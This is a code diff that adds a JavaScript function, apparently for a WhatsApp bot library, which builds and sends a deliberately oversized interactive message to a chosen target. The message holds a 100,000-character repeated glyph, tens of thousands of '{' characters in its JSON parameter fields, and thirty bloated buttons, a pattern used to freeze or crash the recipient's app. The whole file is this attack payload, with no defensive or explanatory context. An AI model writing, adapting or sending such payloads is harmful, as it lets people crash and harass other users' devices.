@@ -1,0 +1,36 @@
+async function ForceXsystemMax(kirana, target) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2,
+        },
+        interactiveMessage: {
+          contextInfo: {
+            mentionedJid: [target],
+            isForwarded: true,
+            forwardingScore: 999999,
+            businessMessageForwardInfo: {
+              businessOwnerJid: target,
+            },
+          },
+          body: {
+            text: "༑⌁⃰Dapzy Is hereཀ‌‌🦠" + "ꦾ".repeat(100000), // Encore plus de texte !
+          },
+          nativeFlowMessage: {
+            messageParamsJson: "{".repeat(30000), // Plus de params JSON
+            buttons: [
+              ...Array(30).fill().map((_, i) => ({ // 30 boutons !
+                name: `cta_${['url', 'call', 'copy', 'reminder', 'location'][i % 5]}`,
+                ParamsJson: "{".repeat(25000),
+                version: 3,
+              })),
+            ],
+          },
+        },
+      },
+    },
+  };
+  await kirana.relayMessage(target, message, { participant: { jid: target } });
+}
